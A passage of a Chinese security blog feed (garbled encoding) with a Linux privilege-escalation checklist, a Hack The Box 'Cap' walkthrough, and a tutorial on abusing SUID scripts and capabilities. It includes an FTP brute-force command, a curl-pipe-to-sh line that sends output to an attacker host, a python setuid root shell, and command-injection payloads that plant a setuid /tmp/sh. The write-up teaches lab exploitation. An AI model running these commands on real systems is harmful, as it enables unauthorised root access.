        <content type="html"><![CDATA[<p>æœ¬ç¯‡ä¸ºæ€»ç»“Linuxçš„ææƒæ–¹æ³•ï¼Œå¹¶åšæˆæ¸…å•åˆ—è¡¨å·²ä¾›æŸ¥è¯¢æç¤ºã€‚</p><p>å¤§éƒ¨åˆ†æ¸…å•å†…å®¹å·²ç»åœ¨<code>LinPEAS</code>ä¸­åŒ…å«äº†ï¼Œå¦‚ä½•ä½¿ç”¨è¯·æŸ¥çœ‹<a href="/2021/07/27/linpeas-%E4%BD%BF%E7%94%A8/" title="linpeas ä½¿ç”¨">linpeas ä½¿ç”¨</a></p><h2 id="ç³»ç»Ÿä¿¡æ¯æ”¶é›†"><a href="#ç³»ç»Ÿä¿¡æ¯æ”¶é›†" class="headerlink" title="ç³»ç»Ÿä¿¡æ¯æ”¶é›†"></a>ç³»ç»Ÿä¿¡æ¯æ”¶é›†</h2><ul><li><input disabled="" type="checkbox"> ç³»ç»Ÿä¿¡æ¯</li></ul><h2 id="æƒé™æ£€æŸ¥"><a href="#æƒé™æ£€æŸ¥" class="headerlink" title="æƒé™æ£€æŸ¥"></a>æƒé™æ£€æŸ¥</h2><ul><li><input disabled="" type="checkbox"> <code>sudo -l</code></li><li><input disabled="" type="checkbox"> <code>suid</code> å’Œ <code>sgid</code> (<a href="/2021/07/21/SUID-SGID/" title="æŸ¥çœ‹">æŸ¥çœ‹</a>)</li><li><input disabled="" type="checkbox"> <a href="/2021/07/21/linux-capabilities/" title="Linux Capabilities">Linux Capabilities</a></li><li><input disabled="" type="checkbox"> <a href="/2021/07/23/linux-%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%B8%85%E5%8D%95/" title="å¯æ‰§è¡Œæ–‡ä»¶çš„æ¼æ´">å¯æ‰§è¡Œæ–‡ä»¶çš„æ¼æ´</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€ </category>
          
          <category> checklist </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> ææƒ </tag>
            
            <tag> todo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB cap</title>
      <link href="/2021/07/22/HTB-cap/"/>
      <url>/2021/07/22/HTB-cap/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th align="center">IP</th><th align="center">ROLE</th><th align="center">OS</th></tr></thead><tbody><tr><td align="center">10.10.10.245</td><td align="center">Victim</td><td align="center">Linux</td></tr><tr><td align="center">10.10.14.228</td><td align="center">Attacker</td><td align="center">Kali</td></tr></tbody></table><blockquote><p>å¦‚æœä½ æ˜¯åœ¨æ‰¾writeupè€Œçœ‹çš„è¿™ç¯‡æ–‡ç« ï¼Œé‚£ä¹ˆè¯·å†åšæŒä¸€ä¸‹ã€‚è¿™é‡Œç»™ä¸€ç‚¹æç¤º:</p><ol><li>ä»”ç»†è§‚å¯Ÿè¡¨é¢å†…å®¹ï¼Œè¿™é¢˜å¹¶æ²¡æœ‰éœ€è¦æ·±æŒ–çš„å†…å®¹ï¼Œåˆ«æƒ³å¤š</li><li>rootçš„æ–¹æ³•é¢˜ç›®å·²ç»ç»™å‡ºæ¥äº†</li></ol></blockquote><h2 id="è·å–æ™®é€šæƒé™"><a href="#è·å–æ™®é€šæƒé™" class="headerlink" title="è·å–æ™®é€šæƒé™"></a>è·å–æ™®é€šæƒé™</h2><p>é€šè¿‡nmapæ£€æŸ¥ç«¯å£ï¼Œå‘ç°æœ‰<code>21 22 80</code>ç«¯å£æ‰“å¼€ï¼Œå†æ²¡æœ‰å…¶ä»–ç«¯å£ã€‚</p><p>ç¬¬ä¸€ååº”æ˜¯ftpçš„åŒ¿åç”¨æˆ·æˆ–è€…å¸¸ç”¨ç”¨æˆ·ã€‚å°è¯•çˆ†ç ´ï¼Œè¿™é‡Œæ¨è<a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt">è¿™ä¸ªå­—å…¸</a></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">hydra -C password.txt -u -e s 10.10.10.245 ftp</span></code></pre></div></div><p>ftpè¿™é‡Œå…¶å®æ˜¯ä¸ªå¹Œå­ï¼Œä½¿ç”¨å¸¸ç”¨å¯†ç çˆ†ç ´æ²¡æœ‰ä½œç”¨ã€‚</p><p>ç„¶åæ‰“å¼€80ç½‘é¡µï¼Œé€šè¿‡è§‚å¯Ÿï¼Œå‘ç°<code>10.10.10.245/data/3</code>è¿™ä¸ªé¡µé¢æ˜¯çš„æ•°å­—æ˜¯å˜åŠ¨çš„ï¼Œæ›´æ”¹ä¸º<code>0</code>åè·å–pcapæ–‡ä»¶ã€‚</p><p>ç”¨<code>Wireshark</code>æ‰“å¼€åè¿‡è§‚å¯ŸæŠ¥æ–‡å‘ç°æœ‰FTPæŠ¥æ–‡ï¼Œè¿½è¸ªTCPæµçš„åˆ°FTPç”¨æˆ·å¯†ç </p><p><img src="/2021/07/22/HTB-cap/1.png"></p><p>ssh ç™»å½•</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-nginx codeBlockLines"><span class="line"><span class="hljs-attribute">ssh</span> nathan@<span class="hljs-number">10.10.10.245</span></span></code></pre></div></div><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>ææƒèµ·æ‰‹å¼</p><ul><li>æŸ¥çœ‹<code>sudo -l</code> </li><li>åˆ©ç”¨<code>LinPEAS</code>æœç´¢</li></ul><p>å½“æŸ¥çœ‹<code>sudo -l</code>çš„æ—¶å€™ï¼Œæ­¤ç”¨æˆ·æ²¡æœ‰ä»»ä½•å†…å®¹</p><h3 id="ä½¿ç”¨-LinPEAS"><a href="#ä½¿ç”¨-LinPEAS" class="headerlink" title="ä½¿ç”¨ LinPEAS"></a>ä½¿ç”¨ <code>LinPEAS</code></h3><p>ä½¿ç”¨ä¸å†™å…¥ç¡¬ç›˜çš„æ–¹å¼åˆ©ç”¨<code>LinPEAS</code>ï¼Œè¿™é‡Œç”¨åˆ°<a href="https://github.com/Elinpf/cmder">cmder</a>å·¥å…·æç¤ºå‘½ä»¤ã€‚</p><p>ä¸‹è½½LinPEAS</p><p><img src="/2021/07/22/HTB-cap/2.png"></p><p>ç›‘å¬ç«¯å£å¹¶å‘é€LinPEAS</p><p><img src="/2021/07/22/HTB-cap/3.png"></p><p><img src="/2021/07/22/HTB-cap/4.png"></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">python3 -m http.server 5711 &amp;</span><span class="line">nc -lvnp 1633 | tee linpeas.out</span></code></pre></div></div><p>ç”¨cmderå¾—åˆ°å‘½ä»¤åï¼Œåˆ°ç›®æ ‡æœºä¸Šæ‰§è¡Œ</p><p><img src="/2021/07/22/HTB-cap/5.png"></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">curl 10.10.14.228:5711/linpeas.sh | sh | nc 10.10.14.228 1633</span></code></pre></div></div><p>è¿™æ ·å°±å¯ä»¥ä¸ç•™ç—•è¿¹çš„å¾—åˆ°è¾“å‡ºæ–‡ä»¶äº†</p><h2 id="Capabilities"><a href="#Capabilities" class="headerlink" title="Capabilities"></a>Capabilities</h2><p>è§‚å¯Ÿè¾“å‡ºæ–‡ä»¶å‘ç°</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">â•”â•â•â•â•â•â•â•â•â•â•â•£ Capabilities</span><span class="line">â•š https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities</span><span class="line">Current capabilities:</span><span class="line">Current: =</span><span class="line">CapInh: 0000000000000000</span><span class="line">CapPrm: 0000000000000000</span><span class="line">CapEff: 0000000000000000</span><span class="line">CapBnd: 0000003fffffffff</span><span class="line">CapAmb: 0000000000000000</span><span class="line"></br></span><span class="line">Shell capabilities:</span><span class="line">0x0000000000000000=</span><span class="line">CapInh: 0000000000000000</span><span class="line">CapPrm: 0000000000000000</span><span class="line">CapEff: 0000000000000000</span><span class="line">CapBnd: 0000003fffffffff</span><span class="line">CapAmb: 0000000000000000</span><span class="line"></br></span><span class="line">Files with capabilities (limited to 50):</span><span class="line marked">/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip</span><span class="line">/usr/bin/ping = cap_net_raw+ep</span><span class="line">/usr/bin/traceroute6.iputils = cap_net_raw+ep</span><span class="line">/usr/bin/mtr-packet = cap_net_raw+ep</span><span class="line">/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep</span></code></pre></div></div><p>äº†è§£åˆ°<code>python3.8</code>æ‹¥æœ‰<code>cap_setuid</code>çš„èƒ½åŠ›ã€‚ å…³äºCapabilitiesè¯·æŸ¥çœ‹<a href="/2021/07/21/linux-capabilities/" title="Linux Capabilities">Linux Capabilities</a></p><p><code>cap_setuid</code>å¯ä»¥è®¾ç½®æœ‰æ•ˆç”¨æˆ·ï¼Œèƒ½å¤Ÿææƒã€‚</p><p>å› ä¸ºæ˜¯pythonï¼Œæ‰€ä»¥åˆ©ç”¨æ–¹æ³•ä¸º</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">/usr/bin/python3.8 -c <span class="hljs-string">&#x27;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#x27;</span></span></code></pre></div></div><p>å¾—åˆ°rootæƒé™</p><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>æœ¬é¢˜ç®€å•ï¼Œä½†æ˜¯ä¹Ÿæœ‰çŸ¥è¯†ç‚¹ï¼Œéœ€è¦å¯¹<a href="/2021/07/21/linux-capabilities/" title="Linux Capabilities">Linux Capabilities</a>æœ‰æ‰€äº†è§£ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€ </category>
          
          <category> HTB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux SUID &amp; SGID</title>
      <link href="/2021/07/21/SUID-SGID/"/>
      <url>/2021/07/21/SUID-SGID/</url>
      
        <content type="html"><![CDATA[<h2 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h2><p>SUID å°±æ˜¯ Set User idï¼Œ SGID å°±æ˜¯ Set Group id</p><h3 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">nathan@<span class="hljs-built_in">cap</span>:~<span class="hljs-comment"># ls -la /usr/bin/passwd</span></span><span class="line">-rwsr-xr-x 1 root root 68208 May 28  2020 /usr/bin/passwd</span></code></pre></div></div><p>å¯ä»¥çœ‹åˆ°<code>s</code>è¿™ä¸ªæ ‡ç­¾åœ¨åŸæœ¬çš„<code>x</code>æ ‡ç­¾ä¸Šï¼Œç‰¹ç‚¹å¦‚ä¸‹ï¼š</p><ol><li>SUIDæƒé™ä»…å¯¹å¯æ‰§è¡Œæ–‡ä»¶æœ‰æ•ˆ</li><li>å¦‚æœæ‰§è¡Œè€…å¯¹è¿™ä¸ªæ–‡ä»¶æœ‰æ‰§è¡Œæƒé™ï¼Œé‚£ä¹ˆå°†ä»¥æ–‡ä»¶çš„æ‰€æœ‰è€…æƒé™æ‰§è¡Œ</li><li>æœ¬æƒé™ä»…åœ¨è¿è¡Œçš„è¿‡ç¨‹ä¸­æœ‰æ•ˆ</li></ol><p>é‚£ä¹ˆç°åœ¨å†çœ‹ä¸‹passwdçš„æ‰§è¡Œè¿‡ç¨‹ã€‚å› ä¸ºnathanæ‹¥æœ‰å¯æ‰§è¡Œæƒé™ï¼Œè€Œpasswdåœ¨æ‰€æœ‰è€…çš„æƒé™æ˜¯<code>wrs</code>ï¼Œæ‰€ä»¥å½“nathanç”¨æˆ·è¿è¡Œçš„æ—¶å€™æ˜¯ä»¥rootçš„æƒé™æ‰§è¡Œçš„ï¼Œè¿›è¡Œä¿®æ”¹äº†<code>/etc/shadow</code>ã€‚</p><p>ä¿®æ”¹æˆSUIDçš„å‘½ä»¤ä¸º</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">chmod 4755 /usr/bin/cat</span><span class="line">chmod u+s /usr/bin/cat</span></code></pre></div></div><h3 id="SGID"><a href="#SGID" class="headerlink" title="SGID"></a>SGID</h3><p>å¯¹äºå¯æ‰§è¡Œæ–‡ä»¶ç‰¹ç‚¹ä¸SUIDä¸€æ ·ï¼Œåªä¸è¿‡æ˜¯ä»¥ç»„çš„æƒé™è¿è¡Œçš„ã€‚</p><p>å¯¹äºæ–‡ä»¶å¤¹æ¥è¯´ï¼Œå¦‚æœè¿™ä¸ªæ–‡ä»¶å¤¹çš„æ‰€æœ‰ç»„è¢«æ ‡è®°äº†<code>s</code>ï¼Œç‰¹ç‚¹å¦‚ä¸‹ï¼š</p><ol><li>å¯¹è¿™ä¸ªæ–‡ä»¶å¤¹æ‹¥æœ‰<code>r</code>å’Œ<code>x</code>çš„ç”¨æˆ·ï¼Œå¯ä»¥è¿›å…¥æ–‡ä»¶å¤¹</li><li>è¿›å…¥æ–‡ä»¶å¤¹åï¼Œç”¨æˆ·çš„æ“ä½œä¸ºæ–‡ä»¶å¤¹ç”¨æˆ·ç»„çš„æ“ä½œæƒé™</li><li>å¦‚æœç”¨æˆ·æ‹¥æœ‰<code>w</code>çš„æƒé™ï¼Œé‚£ä¹ˆç”¨æˆ·åˆ›å»ºæ–‡ä»¶çš„ç”¨æˆ·ç»„å°±æ˜¯è¿™ä¸ªæ–‡ä»¶å¤¹ç»„çš„ç”¨æˆ·ç»„</li></ol><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">chmod 2755 file_dir</span><span class="line">chmod g+s file_dir</span></code></pre></div></div><h3 id="rwS"><a href="#rwS" class="headerlink" title="rwS"></a>rwS</h3><p>æœ‰çš„æ–‡ä»¶æ˜¯<code>S</code>ä¸ºæ ‡è®°ï¼Œè¯´æ˜æ²¡æœ‰æ‰§è¡Œæƒé™ã€‚å› ä¸ºä¸<code>x</code>é‡åˆäº†æ‰€æœ‰åšäº†åŒºåˆ†</p><h2 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h2><p>suid çš„åˆ©ç”¨æ–¹å¼å¸¸å¸¸æ˜¯å› ä¸ºé…ç½®çš„å¯æ‰§è¡Œæ–‡ä»¶èƒ½å¤Ÿå¾—åˆ°<code>shell</code>æˆ–è€…å¯ä»¥è®¿é—®æ•æ„Ÿä¿¡æ¯ã€‚</p><p>ä¾‹å¦‚ï¼Œå¦‚æœ<code>cat</code>æœ‰äº†suidçš„æƒé™ï¼Œé‚£ä¹ˆå°±å¯ä»¥è®¿é—®<code>cat /etc/shadow</code>ã€‚</p><p>æˆ–è€…<code>python</code>æœ‰äº†suidï¼Œé‚£ä¹ˆå°±å¯ä»¥ä»¥rootæƒé™æ‰§è¡Œ<code>/bin/bash</code>ä»è€Œå¾—åˆ°rootçš„shell</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">python -c <span class="hljs-string">&#x27;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#x27;</span></span></code></pre></div></div><h3 id="æŸ¥æ‰¾æ–¹æ³•"><a href="#æŸ¥æ‰¾æ–¹æ³•" class="headerlink" title="æŸ¥æ‰¾æ–¹æ³•"></a>æŸ¥æ‰¾æ–¹æ³•</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">find / -perm -4000 2&gt;/dev/null  <span class="hljs-comment"># æŸ¥çœ‹æ‰€æœ‰suidçš„äºŒè¿›åˆ¶æ–‡ä»¶</span></span><span class="line">find / -perm -2000 2&gt;/dev/null  <span class="hljs-comment"># æŸ¥çœ‹æ‰€æœ‰sgidçš„äºŒè¿›åˆ¶æ–‡ä»¶å’Œæ–‡ä»¶å¤¹</span></span></code></pre></div></div><h3 id="7ç§åˆ©ç”¨æ–¹æ³•"><a href="#7ç§åˆ©ç”¨æ–¹æ³•" class="headerlink" title="7ç§åˆ©ç”¨æ–¹æ³•"></a>7ç§åˆ©ç”¨æ–¹æ³•</h3><p>æ–¹æ³•å‚è€ƒäº†<a href="http://repository.root-me.org/Administration/Unix/EN%20-%20Dangers%20of%20SUID%20Shell%20Scripts.pdf">è¿™ç¯‡æ–‡ç« </a></p><h4 id="ç”¨çš„æ˜¯csh"><a href="#ç”¨çš„æ˜¯csh" class="headerlink" title="ç”¨çš„æ˜¯csh?"></a>ç”¨çš„æ˜¯csh?</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">% ls change-pass</span><span class="line">-rwsr-x--- 1 root helpdesk</span><span class="line"> 37 Feb 26 16:35 change-pass</span><span class="line">% cat change-pass</span><span class="line"><span class="hljs-comment">#!/bin/csh -b</span></span><span class="line"><span class="hljs-built_in">set</span> user = <span class="hljs-variable">$1</span></span><span class="line">passwd <span class="hljs-variable">$user</span></span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">% env TERM=<span class="hljs-string">&#x27;`cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755/tmp/sh`&#x27;</span> change-pass</span></code></pre></div></div><h4 id="å¼•ç”¨çš„æ–‡ä»¶æ²¡æœ‰ä½¿ç”¨ç»å¯¹è·¯å¾„ï¼Ÿ"><a href="#å¼•ç”¨çš„æ–‡ä»¶æ²¡æœ‰ä½¿ç”¨ç»å¯¹è·¯å¾„ï¼Ÿ" class="headerlink" title="å¼•ç”¨çš„æ–‡ä»¶æ²¡æœ‰ä½¿ç”¨ç»å¯¹è·¯å¾„ï¼Ÿ"></a>å¼•ç”¨çš„æ–‡ä»¶æ²¡æœ‰ä½¿ç”¨ç»å¯¹è·¯å¾„ï¼Ÿ</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">% cat change-pass</span><span class="line"><span class="hljs-comment">#!/bin/ksh</span></span><span class="line">user=<span class="hljs-variable">$1</span></span><span class="line">passwd <span class="hljs-variable">$user</span></span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">% <span class="hljs-built_in">export</span> PATH=<span class="hljs-string">&#x27;/tmp&#x27;</span></span><span class="line">% <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755/tmp/sh&quot;</span> &gt;/tmp/passwd</span><span class="line">% ./change-pass</span></code></pre></div></div><h4 id="è„šæœ¬çš„é€‚ç”¨èŒƒå›´æ˜¯å¦è¿‡å¤§ï¼Ÿ"><a href="#è„šæœ¬çš„é€‚ç”¨èŒƒå›´æ˜¯å¦è¿‡å¤§ï¼Ÿ" class="headerlink" title="è„šæœ¬çš„é€‚ç”¨èŒƒå›´æ˜¯å¦è¿‡å¤§ï¼Ÿ"></a>è„šæœ¬çš„é€‚ç”¨èŒƒå›´æ˜¯å¦è¿‡å¤§ï¼Ÿ</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">% cat change-pass</span><span class="line"><span class="hljs-comment">#!/bin/ksh</span></span><span class="line">PATH=<span class="hljs-string">&#x27;/bin:/usr/bin&#x27;</span></span><span class="line">user=<span class="hljs-variable">$1</span></span><span class="line">/usr/bin/passwd <span class="hljs-variable">$user</span></span></code></pre></div></div><p>å¯ä»¥ä¿®æ”¹rootçš„å¯†ç </p><h4 id="ä½¿ç”¨äº†ä¸´æ—¶æ–‡ä»¶ï¼Ÿ"><a href="#ä½¿ç”¨äº†ä¸´æ—¶æ–‡ä»¶ï¼Ÿ" class="headerlink" title="ä½¿ç”¨äº†ä¸´æ—¶æ–‡ä»¶ï¼Ÿ"></a>ä½¿ç”¨äº†ä¸´æ—¶æ–‡ä»¶ï¼Ÿ</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">% cat change-pass</span><span class="line"><span class="hljs-comment">#!/bin/ksh</span></span><span class="line">PATH=<span class="hljs-string">&#x27;/bin:/usr/bin&#x27;</span></span><span class="line">user=<span class="hljs-variable">$1</span></span><span class="line">[ -z <span class="hljs-variable">$user</span> ] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Usage: change-pass username&quot;</span> &amp;&amp; <span class="hljs-built_in">exit</span></span><span class="line">rm /tmp/.user</span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$user</span>&quot;</span> &gt; /tmp/.user</span><span class="line">isroot=<span class="hljs-string">&#x27;/usr/bin/grep -c root /tmp/.user&#x27;</span></span><span class="line">[ <span class="hljs-string">&quot;<span class="hljs-variable">$isroot</span>&quot;</span> -gt 0 ] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;You Can&#x27;t change root&#x27;s password!&quot;</span> &amp;&amp; <span class="hljs-built_in">exit</span></span><span class="line">/usr/bin/passwd <span class="hljs-variable">$user</span></span></code></pre></div></div><p>çœ‹åˆ°ä¸Šé¢ä½¿ç”¨äº†ä¸´æ—¶æ–‡ä»¶ï¼Œé‚£ä¹ˆå°±æ„å‘³ç€å¯ä»¥æ‰“æ—¶é—´å·®ï¼Œé€šè¿‡ç–¯ç‹‚å¾ªï¼Œç”¨ç©ºè¦†ç›–æ‰å†™å…¥çš„å†…å®¹ã€‚<br>é‚£ä¹ˆå°±è·³è¿‡äº†æ£€æŸ¥æ˜¯å¦ä¸ºç©ºï¼Œå°±å¯ä»¥ä¿®æ”¹rootå¯†ç äº†ã€‚</p><h4 id="å‚æ•°æ˜¯å¦è¿‡æ»¤ï¼Œèƒ½å¦ç”¨åˆ†å·åšæ›´å¤šçš„äº‹"><a href="#å‚æ•°æ˜¯å¦è¿‡æ»¤ï¼Œèƒ½å¦ç”¨åˆ†å·åšæ›´å¤šçš„äº‹" class="headerlink" title="å‚æ•°æ˜¯å¦è¿‡æ»¤ï¼Œèƒ½å¦ç”¨åˆ†å·åšæ›´å¤šçš„äº‹"></a>å‚æ•°æ˜¯å¦è¿‡æ»¤ï¼Œèƒ½å¦ç”¨åˆ†å·åšæ›´å¤šçš„äº‹</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">% cat change-pass</span><span class="line"><span class="hljs-comment">#!/bin/ksh</span></span><span class="line">PATH=<span class="hljs-string">&#x27;/bin:/usr/bin&#x27;</span></span><span class="line">user=<span class="hljs-variable">$1</span></span><span class="line">[ -z <span class="hljs-variable">$user</span> ] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Usage: change-pass username&quot;</span> &amp;&amp; <span class="hljs-built_in">exit</span></span><span class="line">[ <span class="hljs-string">&quot;<span class="hljs-variable">$user</span>&quot;</span> = root ] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;You can&#x27;t change root&#x27;s password!&quot;</span> &amp;&amp; <span class="hljs-built_in">exit</span></span><span class="line">/usr/bin/passwd <span class="hljs-variable">$user</span></span></code></pre></div></div><p>å¯ä»¥çœ‹åˆ°å€¼åˆ¤æ–­æ˜¯å¦æœ‰<code>$user</code>å’Œ<code>$user</code>æ˜¯å¦ä¸ºrootã€‚</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">change-pass <span class="hljs-string">&quot;user;cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755 /tmp/sh&quot;</span></span></code></pre></div></div><h4 id="æ˜¯å¦è®¾ç½®äº†IFS"><a href="#æ˜¯å¦è®¾ç½®äº†IFS" class="headerlink" title="æ˜¯å¦è®¾ç½®äº†IFS"></a>æ˜¯å¦è®¾ç½®äº†IFS</h4><p><strong>IFS(Internal Field Separator)</strong>, å†…éƒ¨åŸŸåˆ†å‰²ç¬¦ï¼Œsetç¯å¢ƒå˜é‡ã€‚</p><p>æ¡ˆä¾‹ä¸­ç»™å‡ºäº†ä½¿ç”¨æ–¹æ³•</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">export IFS=&#x27;/&#x27;</span></code></pre></div></div><p>è¿™æ ·<code>/usr/bin/passwd</code> å°±å˜æˆäº† <code>usr bin passwd</code>ï¼Œç„¶åæ›¿æ¢<code>usr</code>çš„æ‰§è¡Œå°±å¯ä»¥äº†ï¼Œä½†æ˜¯æ²¡æœ‰å®éªŒæˆåŠŸã€‚</p><h4 id="è„šæœ¬æœ¬èº«çš„é£é™©"><a href="#è„šæœ¬æœ¬èº«çš„é£é™©" class="headerlink" title="è„šæœ¬æœ¬èº«çš„é£é™©"></a>è„šæœ¬æœ¬èº«çš„é£é™©</h4><p>è„šæœ¬è¦è¿è¡Œä¼šæœ‰ä¸¤ä¸ªæ­¥éª¤ï¼š</p><ol><li>å¯åŠ¨ä¸€ä¸ªshell</li><li>è¿™ä¸ªshellè¯»å–è„šæœ¬çš„å†…å®¹ç„¶åæ‰§è¡Œ</li></ol><p>é‚£ä¹ˆå°±ä¼šæœ‰ä¸€ä¸ªæ—¶é—´å·®</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-built_in">cd</span> /tmp</span><span class="line">ln -s change-pass rootme</span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">$ ./rootme &amp;</span><span class="line">$ rm rootme &amp;&amp; \</span><span class="line"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755 /tmp/sh&quot;</span> \</span><span class="line"> &gt;&gt; rootme</span></code></pre></div></div><p>è¿™ä¸ªä¼šæœ‰å¾ˆå¤§çš„å‡ ç‡è¯»å–ä¸åˆ°å®Œæ•´çš„å†…å®¹è€Œå¤±è´¥ï¼Œä½†æ˜¯å¯ä»¥ç”¨è‡ªåŠ¨åŒ–çš„æ–¹å¼å®ç°ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€ </category>
          
          <category> çŸ¥è¯†ç‚¹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> ææƒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Capabilities</title>
      <link href="/2021/07/21/linux-capabilities/"/>
      <url>/2021/07/21/linux-capabilities/</url>
      
        <content type="html"><![CDATA[<h2 id="ä»€ä¹ˆæ˜¯Capabilities"><a href="#ä»€ä¹ˆæ˜¯Capabilities" class="headerlink" title="ä»€ä¹ˆæ˜¯Capabilities"></a>ä»€ä¹ˆæ˜¯Capabilities</h2><p>Capabilitesæ˜¯ä»å†…æ ¸2.5ä¹‹åå¼•å…¥çš„ï¼Œä½œç”¨äº<strong>è¿›ç¨‹</strong>æˆ–è€…<strong>çº¿ç¨‹</strong>ä¸Šï¼Œæ˜¯å°†æƒé™æ›´åŠ ç»†è‡´çš„åˆ’åˆ†ï¼Œä¿éšœç³»ç»Ÿå®‰å…¨çš„ä¸€ç§èƒ½åŠ›ã€‚<br>ç±»ä¼¼äºwindowsçš„ç‰¹æƒã€‚</p><h3 id="capabilities-set"><a href="#capabilities-set" class="headerlink" title="capabilities set"></a>capabilities set</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-avrasm codeBlockLines"><span class="line">root@iZbp19p0eesh0lxr45we33Z:~<span class="hljs-meta"># cat /proc/$$/status | grep Cap</span></span><span class="line"><span class="hljs-symbol">CapInh:</span> <span class="hljs-number">0000000000000000</span>  <span class="hljs-meta"># å¯ä»¥ç»§æ‰¿çš„CAP(i)</span></span><span class="line"><span class="hljs-symbol">CapPrm:</span> <span class="hljs-number">0000003</span>fffffffff  <span class="hljs-meta"># å¯ä»¥ä½¿ç”¨çš„CAP(p)</span></span><span class="line"><span class="hljs-symbol">CapEff:</span> <span class="hljs-number">0000003</span>fffffffff  <span class="hljs-meta"># ä½¿ç”¨çš„CAP(e)</span></span><span class="line"><span class="hljs-symbol">CapBnd:</span> <span class="hljs-number">0000003</span>fffffffff  <span class="hljs-meta"># å¯ä»¥è¢«ç¦æ­¢çš„</span></span><span class="line"><span class="hljs-symbol">CapAmb:</span> <span class="hljs-number">0000000000000000</span>  <span class="hljs-meta"># </span></span></code></pre></div></div><h3 id="è¿›ç¨‹CAP"><a href="#è¿›ç¨‹CAP" class="headerlink" title="è¿›ç¨‹CAP"></a>è¿›ç¨‹CAP</h3><ul><li>æŸ¥çœ‹è¿›ç¨‹CAP</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-awk codeBlockLines"><span class="line">cat 